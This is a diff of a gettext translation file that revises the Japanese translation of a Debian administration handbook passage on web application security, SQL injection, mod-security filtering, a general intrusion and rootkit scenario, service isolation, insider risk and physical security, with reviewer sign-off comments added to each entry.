-msgstr "ウェブアプリケーションは、その普遍的特徴のおかげで、数多く開発されました。いくつかのアプリケーションは同時に実行されます。たとえばウェブメール、wiki、グループウェアシステム、フォーラム、写真ギャラリー、ブログ、などは同時に実行されます。これらのアプリケーションは「LAMP」(<emphasis>Linux、Apache、MySQL、PHP</emphasis>) スタックに頼っています。残念なことに、多くのアプリケーションがセキュリティ問題を深く考えずに書かれています。外部から提供されるデータは、その妥当性を少しだけ検査するか、全く検査せずに使わることが多いです。特別に細工した値をアプリケーションに渡すことで、あるコマンドの代わりに他のコマンドを実行させることが可能です。多くの最も自明な問題は時間がたてば修正されますが、定期的に新しいセキュリティ問題が生じます。"
+msgstr "ウェブアプリケーションはその普遍的特徴のおかげで広く使われています。いくつかのウェブアプリケーションは同時に実行されます。たとえばウェブメール、wiki、グループウェアシステム、フォーラム、写真ギャラリー、ブログなどは同時に実行されます。これらのウェブアプリケーションは「LAMP」(<emphasis>Linux、Apache、MySQL、PHP</emphasis>) スタックに頼っています。残念なことに、多くのウェブアプリケーションがセキュリティ問題を深く考えずに書かれています。外部から提供されるデータは、その妥当性を少しだけ検査するか、全く検査せずに使わることが多いです。特別に細工した値をアプリケーションに渡すことで、あるコマンドの代わりに他のコマンドを実行させることが可能です。最も自明な問題の多くは時間がたてば修正されますが、定期的に新しいセキュリティ問題が生じます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>VOCABULARY</emphasis> SQL injection"
 msgstr "<emphasis>VOCABULARY</emphasis> SQL インジェクション"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "When a program inserts data into SQL queries in an insecure manner, it becomes vulnerable to SQL injections; this name covers the act of changing a parameter in such a way that the actual query executed by the program is different from the intended one, either to damage the database or to access data that should normally not be accessible. <ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
-msgstr "プログラムが安全性に欠けるやり方で SQL クエリにデータを挿入している場合、プログラムは SQL インジェクションに対して脆弱になります。そして SQL インジェクションとは、パラメータを変更することで、プログラムが実行する実際のクエリを意図しないものに変える行為を指します。これにより、データベースが破壊されたり、通常は利用できないデータへのアクセスを可能にします。<ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
+msgstr "プログラムが安全性に欠けるやり方で SQL クエリにデータを挿入している場合、プログラムは SQL インジェクションに対して脆弱になります。SQL インジェクションとは、パラメータを変更することで、プログラムが実行する実際のクエリを意図しないものに変える行為を指します。SQL インジェクションによりデータベースが破壊されたり、通常は利用できないデータへのアクセスが可能になります。<ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary>SQL injection</primary>"
 msgstr "<primary>SQL インジェクション</primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Updating web applications regularly is therefore a must, lest any cracker (whether a professional attacker or a script kiddy) can exploit a known vulnerability. The actual risk depends on the case, and ranges from data destruction to arbitrary code execution, including web site defacement."
-msgstr "このため、定期的なウェブアプリケーションの更新は不可欠です。これは、クラッカー (プロフェッショナルな攻撃者であるかスクリプトキディであるかに関わらず) からの既知の脆弱性を利用した攻撃を防ぐ意味合いがあります。実際のリスクは場合によりますが、データの破壊、任意のコード実行、ウェブサイトの書き換えなどの範囲におよびます。"
+msgstr "このため、定期的なウェブアプリケーションの更新は不可欠です。これにはクラッカー (プロフェッショナルな攻撃者であるかスクリプトキディであるかに関わらず) からの既知の脆弱性を利用した攻撃を防ぐという意味合いがあります。実際のリスクは場合によりますが、データの破壊、任意のコード実行、ウェブサイトの書き換えなどの範囲におよびます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Knowing What To Expect"
 msgstr "予測される結果を知る"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "A vulnerability in a web application is often used as a starting point for cracking attempts. What follows is a short review of possible consequences."
-msgstr "ウェブアプリケーションの持つ脆弱性はクラッキング行為の足掛かりとして使われることが多いです。以下は、そこから考えられる結果の短い概観を示します。"
+msgstr "ウェブアプリケーションの持つ脆弱性はクラッキング行為の足掛かりとして使われることが多いです。以下では、そこから考えられる結果の短い概観を示します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>QUICK LOOK</emphasis> Filtering HTTP queries"
 msgstr "<emphasis>QUICK LOOK</emphasis> HTTP クエリのフィルタ"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Apache 2 includes modules allowing filtering incoming HTTP queries. This allows blocking some attack vectors. For instance, limiting the length of parameters can prevent buffer overflows. More generally, one can validate parameters before they are even passed to the web application and restrict access along many criteria. This can even be combined with dynamic firewall updates, so that a client infringing one of the rules is banned from accessing the web server for a given period of time."
-msgstr "Apache 2 には、入って来る HTTP クエリをフィルタするモジュールが含まれています。このモジュールを使うことで、いくつかの攻撃ベクトルを妨害することが可能です。たとえば、パラメータの長さに制限を設けることで、バッファオーバーフローを避けることが可能です。より一般的に言えば、ウェブアプリケーションにパラメータを渡す前にパラメータの妥当性を検査させ、アクセスに制限を加えることが可能です。これを動的なファイアウォールの更新に統合することが可能です。こうすることで、ルールを破ったクライアントは、指定された期間ウェブサーバへのアクセスを禁止されることになります。"
+msgstr "Apache 2 には、入って来る HTTP クエリをフィルタするモジュールが含まれています。このモジュールを使うことで、いくつかの攻撃ベクトルを妨害することが可能です。たとえば、パラメータの長さに制限を設けることで、バッファオーバーフローを避けることが可能です。より一般的に言えば、ウェブアプリケーションにパラメータを渡す前にパラメータの妥当性を検査させ、多くの基準に従ってアクセス制限を加えることが可能です。さらにこれを動的なファイアウォールの更新に統合することが可能です。こうすることで、ルールを破ったクライアントは指定された期間ウェブサーバへのアクセスを禁止されることになります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Setting up these checks can be a long and cumbersome task, but it can pay off when the web application to be deployed has a dubious track record where security is concerned."
-msgstr "この種のフィルタを設定することは長く厄介な作業ですが、配備予定のウェブアプリケーションのセキュリティに関する実績が疑わしい場合、効果があります。"
+msgstr "この種のフィルタを設定することは長く厄介な作業ですが、配備予定のウェブアプリケーションのセキュリティに関する実績が疑わしい場合に効果があります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "<emphasis>mod-security2</emphasis> (in the <emphasis role=\"pkg\">libapache2-mod-security2</emphasis> package) is the main such module. It even comes with many ready-to-use rules of its own (in the <emphasis role=\"pkg\">modsecurity-crs</emphasis> package) that you can easily enable."
-msgstr "<emphasis>mod-security2</emphasis> (<emphasis role=\"pkg\">libapache2-mod-security2</emphasis> パッケージに含まれます) はこの機能を提供する主要なモジュールです。<emphasis>mod-security2</emphasis> には簡単に有効化できる専用のすぐに使える数多くのルールが付属しています (<emphasis role=\"pkg\">modsecurity-crs</emphasis> パッケージに含まれます)。"
+msgstr "<emphasis>mod-security2</emphasis> (<emphasis role=\"pkg\">libapache2-mod-security2</emphasis> パッケージに含まれます) はこの機能を提供する主要なモジュールです。<emphasis>mod-security2</emphasis> には簡単に有効化できる専用のすぐに使える数多くのルールが含まれます (<emphasis role=\"pkg\">modsecurity-crs</emphasis> パッケージに含まれます)。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
 msgstr "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary><emphasis>mod-security</emphasis></primary>"
 msgstr "<primary><emphasis>mod-security</emphasis></primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The consequences of an intrusion will have various levels of obviousness depending on the motivations of the attacker. <emphasis>Script-kiddies</emphasis> only apply recipes they find on web sites; most often, they deface a web page or delete data. In more subtle cases, they add invisible contents to web pages so as to improve referrals to their own sites in search engines."
-msgstr "不正侵入に成功した後にどのようなことが行われるかは攻撃者のやる気に依存します。<emphasis>スクリプトキディ</emphasis>はウェブサイトで探し出したレシピを適用するだけです。そしてほとんどの場合、<emphasis>スクリプトキディ</emphasis>はウェブページを書き換えて、データを削除します。さらに悪賢い<emphasis>スクリプトキディ</emphasis>はウェブページに不可視の内容を追加して、サーチエンジンからみた自分のサイトの推薦順位を向上させます。"
+msgstr "不正侵入に成功した後にどのようなことが行われるかは攻撃者のやる気に依存します。<emphasis>スクリプトキディ</emphasis>はウェブサイトで探し出したレシピを適用するだけです。そしてほとんどの場合、<emphasis>スクリプトキディ</emphasis>は攻撃先のウェブページを書き換えるかデータを削除するかします。さらに悪賢い<emphasis>スクリプトキディ</emphasis>はサーチエンジンでより高い順位に自分のサイトを表示させるために攻撃先のウェブページに不可視の内容を追加します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "A more advanced attacker will go beyond that. A disaster scenario could go on in the following fashion: the attacker gains the ability to execute commands as the <literal>www-data</literal> user, but executing a command requires many manipulations. To make their life easier, they install other web applications specially designed to remotely execute many kinds of commands, such as browsing the filesystem, examining permissions, uploading or downloading files, executing commands, and even provide a network shell. Often, the vulnerability will allow running a <command>wget</command> command that will download some malware into <filename>/tmp/</filename>, then executing it. The malware is often downloaded from a foreign website that was previously compromised, in order to cover tracks and make it harder to find out the actual origin of the attack."
-msgstr "さらに上級の攻撃者はこれ以上のことを行います。最悪の筋書きは以下の手順で進みます。すなわち、攻撃者は <literal>www-data</literal> ユーザ権限でコマンドを実行する能力を取得しますが、コマンドを実行するには数多くの操作が必要です。実行を簡単にするために、攻撃者はリモートからさまざまなコマンドを実行する専用に設計された他のウェブアプリケーションをインストールします。このアプリケーションを使うことで、ファイルシステムを閲覧したり、パーミッションを検査したり、ファイルをアップロードおよびダウンロードしたり、ネットワークシェルを提供したりすることが可能になります。しばしば、脆弱性を使って、<command>wget</command> コマンドを使ってマルウェアを <filename>/tmp/</filename> にダウンロードし、マルウェアを実行することが可能になります。このマルウェアは既に不正侵入されている別のウェブサイトからダウンロードされます。こうすることで、攻撃者の痕跡がなくなり、実際の攻撃元に関するヒントを調査することが難しくなります。"
+msgstr "さらに上級の攻撃者はこれ以上のことを行います。最悪の筋書きは以下の手順で進みます。すなわち、攻撃者は <literal>www-data</literal> ユーザ権限でコマンドを実行する能力を取得しますが、コマンドを実行するには数多くの操作を必要とします。作業を簡単に行うために、攻撃者はさらに別のウェブアプリケーションをインストールします。ここでインストールされるウェブアプリケーションはさまざまなコマンド (ファイルシステムの閲覧、パーミッションの検査、ファイルのアップロードおよびダウンロードなど) のリモート実行およびネットワークシェルの提供に特化して設計されています。しばしば、脆弱性を使うことで <command>wget</command> コマンドを使ってマルウェアを <filename>/tmp/</filename> にダウンロードし、マルウェアを実行することが可能になります。このマルウェアは既に不正侵入されている別のウェブサイトからダウンロードされます。こうすることで攻撃者の痕跡がなくなり、本当の攻撃元に関するヒントを調査することが難しくなります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "At this point, the attacker has enough freedom of movement that they often install an IRC <emphasis>bot</emphasis> (a robot that connects to an IRC server and can be controlled by this channel). This bot is often used to share illegal files (unauthorized copies of movies or software, and so on). A determined attacker may want to go even further. The <literal>www-data</literal> account does not allow full access to the machine, and the attacker will try to obtain administrator privileges. Now, this should not be possible, but if the web application was not up-to-date, chances are that the kernel and other programs are outdated too; this sometimes follows a decision from the administrator who, despite knowing about the vulnerability, neglected to upgrade the system since there are no local users. The attacker can then take advantage of this second vulnerability to get root access."
-msgstr "この時点で、攻撃者は IRC <emphasis>ボット</emphasis> (IRC サーバに接続してチャンネルから操作されるロボット) をインストールできる程度の権限を取得しています。このボットは非合法ファイル (映画やソフトウェアなどの無断コピー) を共有するために使われます。意欲的な攻撃者はさらに先へ行きます。<literal>www-data</literal> アカウントはマシンに対する完全なアクセスを許しませんので、攻撃者は管理者権限を取得しようとするでしょう。今現在、これは不可能であるべきです。しかし、ウェブアプリケーションが最新の状態でなければ、おそらくカーネルやその他のプログラムも古いことでしょう。そしてこれはしばしばローカルユーザがいないため脆弱性に関して知っているにも関わらずシステムのアップグレードを無視している管理者の判断です。攻撃者はこの 2 番目の脆弱性に乗じて root アクセスを取得します。"
+msgstr "この時点で、攻撃者は IRC <emphasis>ボット</emphasis> (IRC サーバに接続してチャンネルから操作されるロボット) をインストールできる程度の権限を取得しています。この IRC ボットは非合法ファイル (映画やソフトウェアなどの無断コピー) を共有するために使われることが多いです。意欲的な攻撃者はさらに先へ行きます。<literal>www-data</literal> アカウントはマシンに対する完全なアクセスを許されていないので、攻撃者は管理者権限を取得しようとするでしょう。今現在、これは不可能であるべきです。しかし、ウェブアプリケーションが最新の状態でなければ、おそらくカーネルやその他のプログラムも古いことでしょう。これはしばしばローカルユーザがいないため脆弱性に関して知っているにも関わらずシステムのアップグレードを無視している管理者の判断です。攻撃者はこの 2 番目の脆弱性に乗じて root アクセスを取得します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>VOCABULARY</emphasis> Privilege escalation"
 msgstr "<emphasis>VOCABULARY</emphasis> 特権昇格"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "This term covers anything that can be used to obtain more permissions than a given user should normally have. The <command>sudo</command> program is designed for precisely the purpose of giving administrative rights to some users. But the same term is also used to describe the act of an attacker exploiting a vulnerability to obtain undue rights."
-msgstr "この用語は通常ユーザに与えられていないより高位のパーミッションを取得するために使われる操作のすべてを意味しています。<command>sudo</command> プログラムは、まさにユーザに指定した管理者権限を与える目的で、設計されました。しかし、同じ用語を使って、不当な権限を取得するために脆弱性を活用する攻撃者の振る舞いを表すこともあります。"
+msgstr "特権昇格という用語は通常ユーザに与えられていないより高位のパーミッションを取得するために使われる操作のすべてを意味しています。<command>sudo</command> プログラムはまさにユーザに指定した管理者権限を与える目的で設計されました。しかし、同じ用語を使って不当な権限を取得するために脆弱性を活用する攻撃者の振る舞いを表すこともあります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "Now the attacker owns the machine; they will usually try to keep this privileged access for as long as possible. This involves installing a <emphasis>rootkit</emphasis>, a program that will replace some components of the system so that the attacker will be able to obtain the administrator privileges again at a later time; the rootkit also tries hiding its own existence as well as any traces of the intrusion. A subverted <command>ps</command> program will omit to list some processes, <command>netstat</command> will not list some of the active connections, and so on. Using the root permissions, the attacker was able to observe the whole system, but didn't find important data; so they will try accessing other machines in the corporate network. Analyzing the administrator's account and the history files, the attacker finds what machines are routinely accessed. By replacing <command>sudo</command> or <command>ssh</command> with a subverted program, the attacker can intercept some of the administrator's passwords, which they will use on the detected servers… and the intrusion can propagate from then on."
-msgstr "これで、攻撃者はマシンを自らの支配下に置くことができました。そして攻撃者は通常この特権アクセスを可能な限り長く維持しようとします。そのために攻撃者は <emphasis>rootkit</emphasis> をインストールします。<emphasis>rootkit</emphasis> とは、後から攻撃者が管理者権限を取得することを可能にするために、いくつかのシステムの要素を置き替えるプログラムです。そして rootkit は自分の存在および侵入の形跡を隠そうとします。改竄された <command>ps</command> プログラムはいくつかのプロセスを無視するでしょうし、<command>netstat</command> はいくつかの活動中の接続を表示しないでしょう。root 権限を使って、攻撃者はシステム全体を観察することが可能です。しかし、重要なデータを見つけ出しません。さらに、同じネットワーク内の他のマシンにアクセスしようとします。管理者アカウントと履歴ファイルを解析することで、攻撃者は日常的にアクセスしているマシンを見つけ出します。<command>sudo</command> や <command>ssh</command> を改竄されたプログラムで置き換えることにより、攻撃者は管理者パスワードを横取りすることが可能です。攻撃者はここで横取りした管理者パスワード検出されたサーバで使い… さらに侵入を進めます。"
+msgstr "これで、攻撃者はマシンを自らの支配下に置くことができました。通常、攻撃者はこの特権アクセスを可能な限り長く維持しようとします。そのために攻撃者は <emphasis>rootkit</emphasis> をインストールします。<emphasis>rootkit</emphasis> とは後から攻撃者が管理者権限を取得することを可能にするためにいくつかのシステムの要素を置き替えるプログラムです。さらに rootkit は自分の存在および侵入の形跡を隠そうともします。改竄された <command>ps</command> プログラムはいくつかのプロセスを無視するでしょうし、改竄された <command>netstat</command> はいくつかの活動中の接続を表示しないでしょう。攻撃者は root 権限を使うことでシステム全体を観察することが可能でしたが、重要なデータは見つかりませんでした。そこで攻撃者はさらに同じネットワーク内の他のマシンにアクセスしようとするでしょう。管理者アカウントと履歴ファイルを解析することで、攻撃者は日常的にアクセスしているマシンを見つけ出します。<command>sudo</command> や <command>ssh</command> を改竄されたプログラムで置き換えることにより、攻撃者は管理者パスワードを横取りすることが可能です。攻撃者はここで横取りした管理者パスワードを検出されたサーバで使い、さらに侵入を進めます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This is a nightmare scenario which can be prevented by several measures. The next few sections describe some of these measures."
-msgstr "最悪の筋書きはいくつかの取り組みによって避けることが可能です。以降の節では、その取り組みについて説明します。"
+msgstr "ここで述べた最悪の筋書きはいくつかの取り組みによって避けることが可能です。以降の節では、その取り組みについて説明します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Choosing the Software Wisely"
 msgstr "賢い方法でソフトウェアを選ぶ"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Once the potential security problems are known, they must be taken into account at each step of the process of deploying a service, especially when choosing the software to install. Many web sites, such as <literal>SecurityFocus.com</literal>, keep a list of recently-discovered vulnerabilities, which can give an idea of a security track record before some particular software is deployed. Of course, this information must be balanced against the popularity of said software: a more widely-used program is a more tempting target, and it will be more closely scrutinized as a consequence. On the other hand, a niche program may be full of security holes that never get publicized due to a lack of interest in a security audit."
-msgstr "潜在的なセキュリティ問題が知られると、管理者はサービスを配備するプロセスの各段階、特にインストールするソフトウェアを選ぶ際、に気を配らなければいけません。<literal>SecurityFocus.com</literal> などの多くのウェブサイトが最近発見された脆弱性をリストしています。このおかげで、あるソフトウェアを配備する前にそのソフトウェアのセキュリティ実績の情報を得ることが可能です。もちろん、この情報はそのソフトウェアの人気に比例しています。すなわち、広く使われているプログラムほど標的にされ、結果として注意深く検査されます。逆に、セキュリティ監査に対する関心が欠如していたために、特定分野のプログラムはまだ公表されていない数多くのセキュリティホールを隠しているかもしれません。"
+msgstr "潜在的なセキュリティ問題が知られると、管理者はサービスを配備するプロセスの各段階 (特にインストールするソフトウェアを選ぶ際) でこのセキュリティ問題に気を配らなければいけません。<literal>SecurityFocus.com</literal> などの多くのウェブサイトが最近発見された脆弱性のリストを管理しています。このおかげで、特定のソフトウェアを配備する前にそのソフトウェアのセキュリティ実績の情報を得ることが可能です。もちろん、この情報はそのソフトウェアの人気に比例しています。すなわち、広く使われているプログラムほど標的にされ、結果として注意深く検査されます。逆に、セキュリティ監査に対する関心が欠如していたために、特定分野のプログラムはまだ公表されていない数多くのセキュリティホールを隠しているかもしれません。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>VOCABULARY</emphasis> Security audit"
 msgstr "<emphasis>VOCABULARY</emphasis> セキュリティ監査"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "A security audit is the process of thoroughly reading and analyzing the source code of some software, looking for potential security vulnerabilities it could contain. Such audits are usually proactive and they are conducted to ensure a program meets certain security requirements."
-msgstr "セキュリティ監査とは、ソフトウェアが持つ潜在的なセキュリティ脆弱性を探すためにあるソフトウェアのソースコードを徹底的に読んだり解析することを言います。通常セキュリティ監査は積極的な行動であり、プログラムがある種のセキュリティ要件を満足していることを保証するために行われます。"
+msgstr "セキュリティ監査とはソフトウェアが持つ潜在的なセキュリティ脆弱性を探すためにあるソフトウェアのソースコードを徹底的に読んだり解析することを言います。通常セキュリティ監査は積極的な行動であり、プログラムがある種のセキュリティ要件を満足していることを保証するために行われます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "In the Free Software world, there is generally ample room for choice, and choosing one piece of software over another should be a decision based on the criteria that apply locally. More features imply an increased risk of a vulnerability hiding in the code; picking the most advanced program for a task may actually be counter-productive, and a better approach is usually to pick the simplest program that meets the requirements."
-msgstr "通常フリーソフトウェア世界には多くの選択肢があります。そして、ソフトウェアは現場で適用する基準と同じ選択基準に従い決定するべきです。多くの機能を備えるということは、コードに隠された脆弱性の危険性を増加させることを意味します。そして実際、あるタスクに関する最も先進的なプログラムを選ぶことは逆効果かもしれません。要求を満足する最も単純なプログラムを選ぶほうがより良いと言えるでしょう。"
+msgstr "通常フリーソフトウェア世界には多くの選択肢があります。そして、ソフトウェアは現場で適用する基準と同じ選択基準に従い決定するべきです。多くの機能を備えるということは、コードに隠された脆弱性の危険性を増加させることを意味します。そして実際、あるタスクに関する最も先進的なプログラムを選ぶことは逆効果となる可能性があり、要求を満足する最も単純なプログラムを選ぶことのほうがより良い選択と言えるでしょう。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>VOCABULARY</emphasis> Zero-day exploit"
 msgstr "<emphasis>VOCABULARY</emphasis> ゼロデイ脆弱性"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "A <emphasis>zero-day exploit</emphasis> attack is hard to prevent; the term covers a vulnerability that is not yet known to the authors of the program."
-msgstr "<emphasis>ゼロデイ脆弱性</emphasis>攻撃は防ぐことが難しいです。さらにこの用語は対象プログラムの開発者がまだ知らない脆弱性を意味しています。"
+msgstr "<emphasis>ゼロデイ脆弱性</emphasis>攻撃は防ぐことが難しいです。さらにこの用語は対象プログラムの開発者がまだ知らない脆弱性の意味も持っています。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Managing a Machine as a Whole"
 msgstr "マシン全体の管理"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Most Linux distributions install by default a number of Unix services and many tools. In many cases, these services and tools are not required for the actual purposes for which the administrator set up the machine. As a general guideline in security matters, unneeded software is best uninstalled. Indeed, there is no point in securing an FTP server, if a vulnerability in a different, unused service can be used to get administrator privileges on the whole machine."
-msgstr "多くの Linux ディストリビューションはデフォルトで多数の Unix サービスと多くのツールをインストールします。多くの場合、デフォルトでインストールされるサービスとツールは管理者がマシンをセットアップする本来の目的に必要なものではありません。セキュリティに関する一般的な指針として、不要はソフトウェアをアンインストールすることが最良の方針です。実際、もし FTP サーバ以外の未使用のサービスに含まれる脆弱性を使ってマシン全体の管理者権限が取得される可能性があるのなら、FTP サーバを守ることに意味はありません。"
+msgstr "多くの Linux ディストリビューションはデフォルトで多数の Unix サービスと多くのツールをインストールします。多くの場合、デフォルトでインストールされるサービスとツールは管理者がマシンをセットアップする本来の目的に必要なものではありません。セキュリティには一般的な指針があり、それは不要なソフトウェアをアンインストールすることが最良の選択であるという指針です。実際、もし FTP サーバ以外の未使用のサービスに含まれる脆弱性を使ってマシン全体の管理者権限が取得される可能性があるのなら、FTP サーバを守ることに意味はありません。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "By the same reasoning, firewalls will often be configured to only allow access to services that are meant to be publicly accessible."
-msgstr "同様の理由で、通常ファイアウォールは公開アクセスできるようになる予定のサービスへのアクセスだけを許可するように設定されます。"
+msgstr "同様の理由で、通常ファイアウォールは公開アクセスされる予定のサービスへのアクセスだけを許可するように設定されます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Current computers are powerful enough to allow hosting several services on the same physical machine. From an economic viewpoint, such a possibility is interesting: only one computer to administrate, lower energy consumption, and so on. From the security point of view, however, such a choice can be a problem. One compromised service can bring access to the whole machine, which in turn compromises the other services hosted on the same computer. This risk can be mitigated by isolating the services. This can be attained either with virtualization (each service being hosted in a dedicated virtual machine or container), or with AppArmor/SELinux (each service daemon having an adequately designed set of permissions)."
-msgstr "現在のコンピュータは複数のサービスを 1 台の物理マシン上でホストできる程度に十分強力です。財政的な観点からすると、この可能性は興味深いものです。なぜなら、管理するコンピュータの台数を 1 台で済ませたり、エネルギー消費量を減らすことができるからです。しかしながら、セキュリティの観点からすると、この可能性は問題です。1 つのサービスが不正侵入を受けるだけでマシン全体にアクセスできるようになり、さらに同じコンピュータ上でホストされている他のサービスも不正侵入を受けます。サービスを隔離することでこのリスクを緩和することが可能です。サービスの隔離は仮想化 (各サービスを専用の仮想マシンやコンテナでホストさせる) や AppArmor/SELinux (それぞれのサービスデーモンに適切に設計された一連のパーミッションを設定する) を使って達成されます。"
+msgstr "現在のコンピュータは複数のサービスを 1 台の物理マシン上でホストできる程度に十分強力です。財政的な観点からすると、この可能性は興味深いものです。なぜなら、管理するコンピュータの台数を 1 台で済ませたり、エネルギー消費量を減らしたりすることが可能だからです。しかしながら、セキュリティの観点からすると、このやり方には問題があります。1 つのサービスが不正侵入を受けるだけでマシン全体にアクセスできるようになり、さらに同じコンピュータ上でホストされている他のサービスも不正侵入を受けます。サービスを隔離することでこのリスクを緩和することが可能です。サービスを隔離するには、仮想化 (各サービスを専用の仮想マシンやコンテナでホストさせる) や AppArmor/SELinux (それぞれのサービスデーモンに適切に設計された一連のパーミッションを設定する) を使います。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Users Are Players"
-msgstr "内部ユーザから保護"
+msgstr "内部ユーザからの保護"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Discussing security immediately brings to mind protection against attacks by anonymous crackers hiding in the Internet jungle; but an often-forgotten fact is that risks also come from inside: an employee about to leave the company could download sensitive files on the important projects and sell them to competitors, a negligent salesman could leave their desk without locking their session during a meeting with a new prospect, a clumsy user could delete the wrong directory by mistake, and so on."
-msgstr "セキュリティに関する議論と言えばすぐに、インターネットの無法地帯に隠れた匿名のクラッカーによる攻撃に対する保護を思い浮かべることでしょう。しかし、忘れられがちですが、内部にもリスクがあるという事実があります。具体的に言えば、退職を控えている雇用者は重要なプロジェクトの機密ファイルをダウンロードしてこれを競争相手に売ることが可能です。不注意なセールスマンは新しい顧客とのミーティング中にセッションをロックせずに離席します。不器用なユーザは誤って間違ったディレクトリを削除します。"
+msgstr "セキュリティに関する議論と言えばすぐに、インターネットの無法地帯に隠れた匿名のクラッカーによる攻撃に対する保護を思い浮かべることでしょう。しかし忘れられがちですが、内部にもリスク源が存在します。具体的に言えば、退職を控えている雇用者は重要なプロジェクトの機密ファイルをダウンロードしてこれを競争相手に売ることが可能です。不注意なセールスマンは新しい顧客とのミーティング中にセッションをロックせずに離席します。不器用なユーザは誤って間違ったディレクトリを削除します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The response to these risks can involve technical solutions: no more than the required permissions should be granted to users, and regular backups are a must. But in many cases, the appropriate protection is going to involve training users to avoid the risks."
 msgstr "これらのリスクは技術的に解決できます。つまり、最低限必要な権限よりも高位の権限をユーザに与えるべきではありませんし、定期的なバックアップは必ず必要です。しかし多くの場合、リスクを避けるためにユーザを教育することがより適切なやり方と言えるでしょう。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
 msgstr "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The <emphasis role=\"pkg\">autolog</emphasis> package provides a program that automatically disconnects inactive users after a configurable delay. It also allows killing user processes that persist after a session ends, thereby preventing users from running daemons."
 msgstr "<emphasis role=\"pkg\">autolog</emphasis> パッケージを使うことで、設定可能な遅延時間の後、活動していないユーザからの接続を自動的に切断することが可能です。また、セッションの終了した後に残っているユーザプロセスを kill することが可能です。これにより、ユーザがデーモンを実行することを避けることが可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Physical Security"
 msgstr "物理セキュリティ"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "There is no point in securing the services and networks if the computers themselves are not protected. Important data deserve being stored on hot-swappable hard disks in RAID arrays, because hard disks fail eventually and data availability is a must. But if any pizza delivery boy can enter the building, sneak into the server room and run away with a few selected hard disks, an important part of security is not fulfilled. Who can enter the server room? Is access monitored? These questions deserve consideration (and an answer) when physical security is being evaluated."
-msgstr "コンピュータ本体が保護されていなければ、サービスとネットワークの保護は無意味です。重要なデータは RAID アレイ内のホットスワップ対応のハードディスクに保存するだけの価値があります。なぜなら、ハードディスクは壊れるものですし、データの可用性は不可欠だからです。しかし、ピザ配達人が建物に入って、サーバ部屋に忍び込んで、いくつかの選ばれたハードディスクを盗んで逃げることが可能な場合、セキュリティの重要な部分が満足されていません。誰がサーバ部屋に入れるのでしょうか? 入室と退室は監視されていますか? これらの質問は、物理セキュリティを評価する際に、考慮 (そして回答に) に値します。"
+msgstr "コンピュータ本体が保護されていなければ、サービスとネットワークの保護は無意味です。重要なデータは RAID アレイ内のホットスワップ対応のハードディスクに保存するだけの価値があります。なぜならハードディスクは壊れるものですし、データの可用性は不可欠だからです。しかし、ピザ配達人が建物に入って、サーバ部屋に忍び込んで、いくつかの選ばれたハードディスクを盗んで逃げることが可能な場合、セキュリティの重要な部分が満足されていません。誰がサーバ部屋に入れるのでしょうか? 入室と退室は監視されていますか? これらの質問は物理セキュリティを評価する際に考慮 (そして回答) に値します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Physical security also includes taking into consideration the risks for accidents such as fires. This particular risk is what justifies storing the backup media in a separate building, or at least in a fire-proof strongbox."
-msgstr "物理セキュリティには、たとえば火事などの災害のリスクを考慮することが含まれます。この特別なリスクがあるために、バックアップメディアを別の建物か少なくとも防火金庫に保存することが正当化されます。"
+msgstr "物理セキュリティには、たとえば火事などの災害のリスクを考慮することも含まれます。災害という特別なリスクがあるために、バックアップメディアを別の建物か少なくとも防火金庫に保存することが正当化されます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Legal Liability"
 msgstr "法的責任"
 
